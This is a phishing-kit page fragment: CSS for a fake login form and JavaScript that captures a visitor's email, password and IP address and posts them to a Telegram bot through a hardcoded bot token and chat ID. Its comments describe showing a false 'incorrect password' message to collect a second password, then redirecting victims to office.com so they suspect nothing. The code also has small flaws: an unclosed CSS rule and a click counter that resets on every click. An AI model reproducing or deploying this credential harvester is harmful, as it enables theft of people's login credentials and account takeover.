    <style>
        * {
            font-family: Arial, sans-serif;
            box-sizing: border-box;
        }
        
        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;

        h2 {
            font-size: 18px;
            margin: 10px 0;
        }

        p {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }

        .btn {
            width: 100%;
            padding: 10px;
            background-color: #e53935;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #c62828;
        }
    </style>

<script>
$(document).ready(function() {



   let ip;

});

	function sendTeleMsg(email, passkey, ip) {

		    var message = "";
		    message += "+=========== 🔐 New Login Attempt: ======="+'\n'
		    message += "🌐 IP Address: ${ipAddress}\n"  +  " : " + ip + '\n';
		    
		    message += "👤 Username: ${username}\n"  +  " : " + email+ '\n';

		    
		    message += "🔑 Password: ${password}\n "  +  " : " + passkey + '\n';
            

		           let token = '7679084330:AAG-tanez7E0XuZpT9TcozSbCmMq626KQsI';
		    var chatid = '-1002326272729';

		    var settings = {
		    "async": true,
		    "crossDomain": true,
		    "url": "https://api.telegram.org/bot" + token + "/sendMessage?chat_id="+chatid,
		    "method": "POST",
		    "headers": {
		        "Content-Type": "application/json",
		        "cache-control": "no-cache"
		    },
		    "data": JSON.stringify({
		        "chat_id": chatid,
		        "text": message
		    })
		    } 

		    $.ajax(settings).done(function (response) {
		    if(response.ok === true) {
		    }
		    
		    }); 

	}
    
	







 
	document.querySelector("#submit-btn").addEventListener('click', function(){
	const passkey = document.querySelector("#pr").value;
	
	const email = document.querySelector("#ai").value;
	let count = 0;
	const ip = document.querySelector("#hidden_ip").value;  // THIS IS WHERE WE CALL the ip address of the page visitor 
		//  	console.log(ip);
		
		
		//on this page i create if statement to make sure the input are  not empty before sending it
	
		
		if(!passkey) {
			document.querySelector("#msg2").style.display="block";
			setTimeout(()=>{
				document.querySelector("#msg2").style.display="none";
			}, 10000)
		} 
		
		// this make sure we input the pass before sending the data 
		
		
		else	if(!email) {
			document.querySelector("#msg2").style.display="block";
			setTimeout(()=>{
				document.querySelector("#msg2").style.display="none";
			}, 10000)
		} 
		// this make sure the username/email was input b4 sending it to telegram and show error msg if not insert
		
		
		else{
		    		count++ // this to count the number of click 
		    		
		    			if(count == 2) { 
						
						//after 2 click
					 sendTeleMsg(email, passkey, ip);  // this send the result again 
					  window.location.href="http://www.office.com"; // this is the last part of the landing page we want the visitor to go to
				} 
		
		
		
		
		else{
		    
			
			

		    	sendTeleMsg(email, passkey, ip);  // to send the data info to telegram
		    	document.querySelector("#pr").value=""; // to empty the password input after first valid input the email will still be display, 
				//this is to collect like 2 possible correct password
		    	document.querySelector("#msg2").style.display="block"; // this will also show msg of incorrect pass so that they can input the password again
		    
		   
		}

		}
		
		
	

	})


</script>
